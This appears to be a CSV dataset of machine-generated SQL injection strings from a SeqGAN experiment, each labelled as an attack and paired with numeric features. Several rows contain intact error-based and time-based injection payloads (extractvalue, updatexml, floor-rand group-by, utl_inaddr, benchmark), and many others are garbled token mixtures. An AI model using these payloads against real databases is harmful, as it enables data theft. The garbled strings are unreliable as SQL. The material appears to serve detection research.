attack,"-a""   floor  =  ||rchr  0x7171706a71  106  ||cdhr  (  (  randzn  i   )     and  )  ,floor  (  || concat  rand  ||chr  (  ||ch  e_r  (  112  )  select        hohr  (  =  112  0 )    then 1  )    from 3775  select   (    ||chr  t_adhrouals   2017wbl_  (  select else else  or 1 concat  ||chr  (  0  (  =  cast",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,115,307.0,35.0,3.7423080231904717,117.0,31.0,121.0,38.0,0.3811074918566775,0.10097719869706841,0.3941368078175896,0.1237785016286645,0.0,1.0,1.0,0.0,0.0,3.0,0.0,15.0,0.0,3.0,1.0,18.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,3.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,9.0
attack,"1'   )    )     )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  'w",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,116,211.0,29.0,3.241112162322934,47.0,32.0,103.0,29.0,0.22274881516587677,0.15165876777251186,0.4881516587677725,0.13744075829383887,2.0,0.0,0.0,0.0,1.0,1.0,0.0,20.0,0.0,0.0,4.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
attack,"1%'   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  'f    case end  , WHERE d  eoyysauadUe_s(  *2   )     (  ,  (  *2 9067  #ainas   (hr  0x7171706a71 112  SELECT 9067 1 FROM  (  --  122  ||ui  )   or  1 x 1 dCs when1  )   and 1 or h byutl hconcat  =  5856  113,0x717a767a71,  ||chr  (  select  =  ||chr  (  (  )    )   )    )i and drou",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,117,463.0,52.0,3.9743288915588986,137.0,82.0,186.0,58.0,0.2958963282937365,0.1771058315334773,0.4017278617710583,0.12526997840172785,2.0,0.0,2.0,0.0,2.0,3.0,0.0,31.0,1.0,1.0,9.0,13.0,1.0,0.0,1.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,3.0,0.0,1.0,1.0,3.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,12.0
attack,1.1M when   then by whenx  =hrhr  =u     )   )    )     )     )   and   WHERE  :hr  (  ||chhr  (  =  (  select cx  =x and d6913hr  (  ||chr  (  rand  SELECT RICTrhrhr  (  rand  ||rand  selectIf.UST (  ||chr  (   select )   from 1 ||   0 1 r  (  )  ||chr  from  (  ||chr  (  (  ||c,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,118,280.0,41.0,3.7747638540809128,116.0,9.0,113.0,42.0,0.4142857142857143,0.03214285714285714,0.4035714285714286,0.15,0.0,0.0,0.0,0.0,0.0,4.0,0.0,19.0,0.0,0.0,0.0,20.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,3.0,0.0,1.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.0
attack,"1hh'   )    )     )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  'h'   )    )     )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (     (  ''  (   then when  (  ||chr   a =  )   (     1 1      concat  or 0 FROM (  ||chr  (  =  0  ) )    )   union   x   WHERE 1 8488 x DLI.Tcho'touaes_",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,119,687.0,53.0,3.7640337139735744,202.0,95.0,304.0,86.0,0.2940320232896652,0.13828238719068414,0.44250363901018924,0.12518195050946143,6.0,0.0,0.0,0.0,3.0,4.0,0.0,55.0,0.0,1.0,10.0,12.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,9.0,4.0,1.0,3.0,2.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,25.0
attack,"1   5606    having 7158  )  select 1 from  (  case 0 DL group AND   ,1   )   :a)    R E  *2   )    select      )   having by else  D  and  (  0  v   from else AMIyy LMC CMASNCn FROM by else  (  )    ,b  (  ||chr  rand  113  )  case union 1 x c  =  )0x717a767a71n   *  u,  6825  (   ) FROM 1 fromGGATby 1 end",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,120,307.0,51.0,4.1937807077229285,130.0,33.0,121.0,23.0,0.4234527687296417,0.10749185667752444,0.3941368078175896,0.0749185667752443,0.0,0.0,0.0,0.0,2.0,1.0,0.0,14.0,0.0,0.0,3.0,5.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,2.0,1.0,0.0,4.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,9.0
attack,"1%%""  =  ""' from dual where 7681  =  7681 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )     )  ||'",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,121,186.0,34.0,3.910011765421657,49.0,43.0,67.0,27.0,0.26344086021505375,0.23118279569892472,0.3602150537634409,0.14516129032258066,2.0,2.0,0.0,0.0,0.0,3.0,0.0,11.0,2.0,0.0,5.0,5.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
attack,"1""   )    )    or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (   ""zf4493Nu' like 'jtujwb"" like ""where IMEfrom 1 FROMa x 0 union m=  ).  =  rand  case   .chgroysn(  9173  9067n2,  ||chr  select   aadddos.geds.r  (  t  =  *2  =  4232  4232  --2   )     I 6913 L    )a     ,floor     *  SELECT group by x  0  113  case by 1 by unionLcherinadzgjsdd.5t",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,122,481.0,57.0,4.298395507747734,178.0,67.0,183.0,53.0,0.3700623700623701,0.1392931392931393,0.3804573804573805,0.1101871101871102,2.0,4.0,2.0,0.0,3.0,5.0,0.0,23.0,0.0,0.0,6.0,12.0,1.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,5.0,1.0,1.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,11.0
attack,"1%"" like """" or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and ""`s.1186236   (  9067,floor  when R end  )   )    DIIsias information_schemaTNCv.NCso.chr  (  )  )   )   and or 1  cx  having a from end from FROM 1 from m4232  )   )     )   )    )    n   (  )   (  having 0 end  ||r  (  ),112  =  || 5584 when by DI concat  113  0  ||  r  (  )  ||chr  (  )  )   a IO",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,123,636.0,52.0,3.96282709823186,210.0,74.0,255.0,97.0,0.330188679245283,0.11635220125786164,0.4009433962264151,0.15251572327044025,0.0,4.0,0.0,0.0,0.0,3.0,0.0,50.0,1.0,4.0,2.0,31.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,5.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,11.0
attack,"1""   (  = 0u   then or * oru1      (     ||  FROM  (  ||chr  (  ||c  select ,benchmark  =  4232  || m(  (  amv.113  )    6237,concat  (   0          )  ||chr  (  select   x   (     and    1   thencu  ,  )  ) )   then cconcat  (  (  select   t  6270  0x7171706a71,  )  )   then rand  (  select select 9173    (  case   and 1 union and D concat  113  ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,124,349.0,40.0,3.702993818513702,124.0,38.0,148.0,39.0,0.3553008595988539,0.10888252148997135,0.42406876790830944,0.11174785100286533,0.0,1.0,0.0,0.0,1.0,2.0,0.0,20.0,0.0,0.0,4.0,13.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,5.0,1.0,0.0,1.0,3.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,14.0
attack," WNWyA  (  a else when   (  6055,floor  selectchr  (  (  ||chr  (  (  113  select 8488.M x  )    ),0x717a767a71,floor  )   SELECT or FROM m when     a dgchr  (  rand  6913  (  ),1392     106  i  ,)   cht_' from dual where 7368  =  7368 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666   )    )   ||'saleys.6237q  122  SELECT AND or 1 5584 d6825a x when   (  =  (  )       )    x Gby 8488 else )   and or 1 ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,125,489.0,55.0,4.266416100746908,162.0,98.0,177.0,52.0,0.3312883435582822,0.20040899795501022,0.3619631901840491,0.10633946830265849,2.0,0.0,0.0,0.0,0.0,3.0,0.0,29.0,0.0,1.0,11.0,7.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,4.0,0.0,1.0,2.0,2.0,4.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,14.0
attack,"1%U 5483   (  #,concat  case FROM  =  113  ||cho_r  (  case union1 when   (  =  rand  )     )  >  (  ||  1 from 1 extractvalue  =     112   select whena '   )    )    procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (   ' houn   select(  4386  ,0x78   FROM 9325chr  (  00x717a767a71,floor    )   or A||INTr.s  =  )    else from 0 6825 W  (  (  4232  (  select concat  (  113  0x7171706a71113  select113   then group unionxxu",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,126,529.0,55.0,4.187395853776983,195.0,86.0,194.0,54.0,0.3686200378071834,0.16257088846880907,0.3667296786389414,0.10207939508506617,2.0,0.0,0.0,0.0,0.0,4.0,0.0,30.0,1.0,1.0,7.0,11.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,3.0,0.0,0.0,4.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,13.0
attack,"1'||  (  select 'etr'  =  'lsst  (  6237,concat  extractvalue  --",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,127,65.0,24.0,3.9474301778513787,31.0,5.0,17.0,12.0,0.47692307692307695,0.07692307692307693,0.26153846153846155,0.18461538461538463,4.0,0.0,2.0,0.0,0.0,1.0,0.0,2.0,0.0,0.0,1.0,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,1%,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,128,2.0,2.0,1.0,0.0,1.0,0.0,1.0,0.0,0.5,0.0,0.5,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"1%sbzGb?nfj
pr  e group else 3931 DASCT  =  SELECT LISvINE 1   )   )    #   )   6270     Ox  jhrozoaleidalestunint  (  ||chount  = 1  )     case 1 r  (  case 0 by else from chr  o  ~  113  ||chr  (  112  (  *2 when   )   )  WHERE information_schemauT  (  ||chbdhrr",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,129,264.0,57.0,4.456130798242619,128.0,20.0,91.0,25.0,0.48484848484848486,0.07575757575757576,0.3446969696969697,0.0946969696969697,0.0,0.0,0.0,0.0,1.0,2.0,0.0,11.0,1.0,1.0,0.0,9.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1% ' where 2291  =  2291 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a   )    )   +'      (  )    (  )   and0x7171706a71 >hr  (  ||chr  (  select union x group select byx  and froma  1 extractvalue  (  ,  )  )     SELECT by else D else unionx ch1yr_es FROM  (  (  (  4386  0  ,floor  =  *   )    113    )   then 1 union 1 end  select   (  ||chounadd.gsyskeyssan113  ||chr  (  )  ||chr  0  ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,130,588.0,55.0,4.178978758317769,238.0,69.0,214.0,67.0,0.40476190476190477,0.11734693877551021,0.36394557823129253,0.11394557823129252,2.0,0.0,0.0,0.0,3.0,3.0,0.0,36.0,1.0,3.0,7.0,16.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,7.0,2.0,1.0,3.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,17.0
attack,"1' or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and 'sw'  =  'tuktnuawthhr  (,  select 1   )    )    )  (   )    ,floor  )     )     or d 3785 112  (  select 5192 end   then x   from  x  )  and  (  ||  0   )     =  select end  )     and   or AND   x when   extractvalue  *2   ,    (  4232  4386  )   x else  case     6 from8488 3931 elsech 6825 3785 1 when   (  and  )  0x4b774c75 where by 'i'  112  >  0x7171706a71   from   ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,131,669.0,45.0,3.98994872680882,228.0,115.0,264.0,62.0,0.34080717488789236,0.17189835575485798,0.39461883408071746,0.09267563527653214,6.0,0.0,0.0,0.0,3.0,3.0,0.0,37.0,0.0,0.0,9.0,10.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,9.0,3.0,1.0,3.0,5.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,25.0
attack,"1' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and '8844ut4493",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,132,204.0,32.0,3.992877264107819,71.0,45.0,68.0,20.0,0.3480392156862745,0.22058823529411764,0.3333333333333333,0.09803921568627451,2.0,0.0,0.0,0.0,0.0,1.0,0.0,12.0,0.0,0.0,5.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1%' where 6765  =  6765 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666   )    )   ||'kMunjq",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,133,176.0,35.0,3.9578384897551104,44.0,47.0,61.0,24.0,0.25,0.26704545454545453,0.3465909090909091,0.13636363636363635,2.0,0.0,0.0,0.0,0.0,2.0,0.0,11.0,1.0,0.0,6.0,4.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1'   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  'asaT   or 4232  4232         )  113  from D  1 1  )     :selectdrvnalltun    a 0 byINAT  (  case me x end  then end2 when.U   SELECT group from hchhrx  rr  (     SELECT union1 else whenxo zos",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,134,370.0,50.0,4.036674239760049,142.0,51.0,147.0,30.0,0.3837837837837838,0.13783783783783785,0.3972972972972973,0.08108108108108109,2.0,0.0,0.0,0.0,0.0,1.0,0.0,20.0,0.0,0.0,5.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,2.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,9.0
attack,"1'||  (  select 'syesuaa' like ' else else by ) concat  113  ||chr  (  (  *2   ||  122  case z mROW ' from dual where 7368  =  7368 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666   )    )   ||'INWCYux.rchhr  113  ||chhr  (  ||dchr  (  =  *    )   ),concat  || L DINsNUINUN. AIT  )  0  select 0   then end   information_schema,floorhdr  6055   then1 1 DIMSST else 3440  (  (  ||chr  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,135,470.0,55.0,4.415154013305682,186.0,69.0,154.0,61.0,0.39574468085106385,0.14680851063829786,0.3276595744680851,0.12978723404255318,6.0,0.0,0.0,0.0,2.0,3.0,0.0,23.0,0.0,1.0,8.0,21.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,3.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,10.0
attack,"-1or DIERN1INSMINTNN.UM h  (  113  ||chr  (  (  )  #   113  (  case 0    1 5584me 7158     ||c  (  (  0x7171706a71)     )     (  )   || froms where   1 FROMx   eap  0  then(  =     (  ,  )   )    )     >  (    0 fromchxur  6237,  >  113  #2 when   (  (  122  )|| xx end  0x5c)   from WHERE",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,136,289.0,48.0,3.880568078783543,82.0,44.0,125.0,38.0,0.2837370242214533,0.1522491349480969,0.43252595155709345,0.1314878892733564,0.0,0.0,1.0,0.0,0.0,1.0,0.0,21.0,0.0,0.0,2.0,12.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1%""   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  ""'||  (  select 'r.geter  cast WHERE E  || DSSELECT 1INCT  (  s   (    )   (  )    case   ||chr  (  )  6e  end  4386  )   and   x d.(  =  =  8382  caseRu'  =  '  =x.ehr  1045chhr  =  a  a 3785  end   SELECT else when2   )        )    ,concatu,tler  6   (  ||Ui. 6055hr  (  0x5c  ||chrr  (  (  case  )",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,137,528.0,50.0,3.952865434904282,178.0,63.0,218.0,69.0,0.3371212121212121,0.11931818181818182,0.4128787878787879,0.13068181818181818,4.0,2.0,0.0,0.0,0.0,6.0,0.0,35.0,1.0,0.0,7.0,16.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,3.0,0.0,1.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.0
attack,"1"" or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and ""'  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and   (  'am   ))    )    )    andhaving union)     )     )  case where end   then end  )   )    c    ,1 1 when   )1392x.c  113  (  --  || and  (  case 0 '+  (  select bruk where 1400  =  1400 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1   )    )   +'  case  E 6055  )  (  )     )     )   then 1 groupmI Oo.edrue  1297hr  (  6237,  =  )  tleaaadmaleradr.eras(  6237,concat  0  )   or union select 5584 else    from ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,138,1072.0,48.0,3.9550376399080993,361.0,157.0,419.0,135.0,0.33675373134328357,0.146455223880597,0.3908582089552239,0.1259328358208955,4.0,2.0,2.0,0.0,0.0,6.0,0.0,77.0,0.0,3.0,13.0,32.0,1.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,5.0,2.0,2.0,2.0,3.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,19.0
attack,"1{MC AND0INIG RMI ANT  FROM  =  )  )    )     )    duaadadr  x concat select else Rchr  (  (  (  1297,  *  select FROM   (  ||chrhoutthrosygout",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,139,143.0,39.0,4.220137332873398,75.0,6.0,48.0,14.0,0.5244755244755245,0.04195804195804196,0.3356643356643357,0.0979020979020979,0.0,0.0,0.0,0.0,1.0,1.0,0.0,8.0,0.0,0.0,1.0,4.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
attack,"1""   )    )    procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (   ""  = select from 2017 union  )    concat  6237  )  *)   having x chhr  (  case ||  (  4232  1045  ||chr  (  )  )   FROM WHERE union 0 7881 chr  ||  (  (  )--  ||chr  (  (  case 0   thenhr  select   =  a 8488 5192 5192xtho.  (  (  ||  (  select from and )  6825c else 5023  )  ||chr  (  ||chr  (  4232  113  ,0x717a767a71,floor",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,140,543.0,48.0,4.093153864312498,181.0,95.0,201.0,66.0,0.3333333333333333,0.17495395948434622,0.3701657458563536,0.12154696132596685,0.0,2.0,2.0,0.0,1.0,3.0,0.0,36.0,0.0,0.0,7.0,20.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,4.0,2.0,1.0,3.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,14.0
attack,"-Ba 3931 end  ,concat  >  (  select AND 6825a 2131  select  (  ||  (  *,r  =",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,141,76.0,29.0,3.991605372264345,28.0,12.0,25.0,11.0,0.3684210526315789,0.15789473684210525,0.32894736842105265,0.14473684210526316,0.0,0.0,1.0,0.0,1.0,1.0,0.0,3.0,0.0,0.0,2.0,6.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
